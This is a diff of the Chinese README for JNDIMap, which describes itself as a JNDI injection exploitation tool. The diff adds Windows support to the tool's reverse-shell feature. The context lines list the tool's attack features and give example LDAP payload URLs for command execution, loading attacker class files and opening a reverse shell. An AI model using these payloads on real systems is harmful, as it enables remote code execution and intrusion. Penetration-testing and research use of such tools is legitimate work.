@@ -6,7 +6,7 @@ JNDIMap 是一个 JNDI 注入利用工具
 
 - DnsLog
 - 命令执行
-- 原生反弹 Shell
+- 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml 绕过高版本 JDK
 - MLet 探测可用 Gadget
@@ -28,7 +28,7 @@ ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtYSBDYWxjdWxhdG9yCg==
 ldap://127.0.0.1:1389/Basic/FromCode/<base64-java-bytecode>
 ldap://127.0.0.1:1389/Basic/FromPath/<base64-path-to-evil-class-file>
 
-# 反弹 Shell
+# 反弹 Shell (支持 Windows)
 ldap://127.0.0.1:1389/Basic/ReverseShell/127.0.0.1/4444
 
 # 以下 Bypass 方式支持 Basic 所有功能
